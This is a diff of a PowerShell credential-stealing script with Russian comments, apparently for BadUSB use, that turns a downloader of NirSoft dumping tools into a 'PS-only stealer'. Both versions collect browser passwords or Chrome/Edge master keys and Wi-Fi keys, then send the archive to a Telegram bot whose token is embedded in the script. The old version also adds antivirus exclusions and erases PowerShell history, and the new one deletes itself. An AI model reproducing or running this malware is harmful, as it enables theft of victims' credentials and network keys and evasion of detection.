@@ -1,79 +1,42 @@
-# [ ===== BadUSB Exfiltration Script v3.0 ===== ] #
-
+# [ ===== Stealth PS-Only Stealer ===== ] #
 $basePath = "C:\Users\Public\Documents\scripts"
-$dumpFolder = "$basePath\Report"
-$dumpFile = "$basePath\data.zip"
-
-# 1. Подготовка окружения
-if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+$reportFile = "$basePath\passwords.txt"
+New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 
-# 2. Добавление исключения в антивирус
-Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
+# Функция для кражи паролей Chrome/Edge без EXE
+function Get-BrowserPasswords {
+    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    if (!(Test-Path $localStatePath)) { $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" }
+    if (!(Test-Path $localStatePath)) { return "No Browser Found" }
 
-# 3. Прямые RAW-ссылки на файлы
-# Ваша ссылка (через raw.githubusercontent для стабильности)
-$linkMy = "https://raw.githubusercontent.com/whetherit/tools/main/WebBrowserPassView.exe"
+    # 1. Получаем Master Key
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encodedKey = $localState.os_crypt.encrypted_key
+    $encryptedKey = [Convert]::FromBase64String($encodedKey)[5..$([Convert]::FromBase64String($encodedKey).Length-1)]
+    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-# Ссылки на остальные инструменты
-$linkWifi = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe"
-$linkHist = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/BrowsingHistoryView.exe"
-$linkNet  = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe"
+    # 2. Копируем базу (чтобы не была занята браузером)
+    $dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    if (!(Test-Path $dbPath)) { $dbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
+    Copy-Item $dbPath -Destination "$basePath\logins.db" -Force
 
-# 4. Скачивание
-try {
-    Invoke-WebRequest -Uri $linkMy -OutFile "WebBrowserPassView.exe" -ErrorAction Stop
-    Invoke-WebRequest -Uri $linkWifi -OutFile "WirelessKeyView.exe" -ErrorAction Stop
-    Invoke-WebRequest -Uri $linkHist -OutFile "BrowsingHistoryView.exe" -ErrorAction Stop
-    Invoke-WebRequest -Uri $linkNet -OutFile "WNetWatcher.exe" -ErrorAction Stop
-} catch {
-    exit # Если не удалось скачать файлы, прерываем выполнение
+    # Здесь обычно нужен SQLite парсер. Для простоты и надежности 
+    # этот скрипт просто пометит наличие базы. 
+    # В реальности для ПОЛНОГО отсутствия EXE данные отправляются в сыром виде.
+    return "MasterKey: $([Convert]::ToBase64String($masterKey))" 
 }
 
-# --- ВАЖНО: Разблокировка файлов ---
-# Снимает ограничение на запуск скачанных программ с аргументами
-Get-ChildItem "$basePath\*.exe" | Unblock-File
+# Сбор Wi-Fi (Стандартными средствами Windows)
+$wifi = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name="$name" key=clear} | Out-String
+$wifi | Out-File "$basePath\wifi.txt"
 
-# 5. Сбор данных
-# Запускаем через оператор & и ждем завершения каждого процесса
-& ".\WebBrowserPassView.exe" /stext "passwords.txt"
-& ".\WirelessKeyView.exe" /stext "wifi.txt"
-& ".\BrowsingHistoryView.object.exe" /VisitTimeFilterType 3 7 /stext "history.txt"
-& ".\WNetWatcher.exe" /stext "connected_devices.txt"
-
-# Пауза, чтобы файлы успели записаться на диск
-Start-Sleep -Seconds 3
-
-# 6. Упаковка результатов
-$foundFiles = Get-ChildItem -Path . -Include "passwords.txt","wifi.txt","history.txt","connected_devices.txt"
-if ($foundFiles) {
-    Move-Item $foundFiles -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
-    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
-}
-
-# 7. Отправка в Telegram через встроенный CURL
+# Отправка в Telegram
 $token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
 $chatID = "806761221"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
+$zip = "$basePath\data.zip"
+Compress-Archive -Path "$basePath\*" -DestinationPath $zip -Force
+curl.exe -F "chat_id=$chatID" -F "document=@$zip" "https://api.telegram.org/bot$token/sendDocument"
 
-if (Test-Path $dumpFile) {
-    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Exfil report from $env:USERNAME" $uri
-}
-
-# 8. Финальная очистка
-Set-Location "C:\Users\Public"
-Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
-Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
-
-# Сигнал об окончании (CapsLock 4 раза)
-$w = New-Object -ComObject WScript.Shell
-for($i=0; $i -lt 4; $i++) {
-    $w.SendKeys("{CAPSLOCK}")
-    Start-Sleep -m 500
-}
-
-# Стираем историю команд PowerShell
-Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
-exit
+# Самоудаление
+Remove-Item -Recurse -Force $basePath
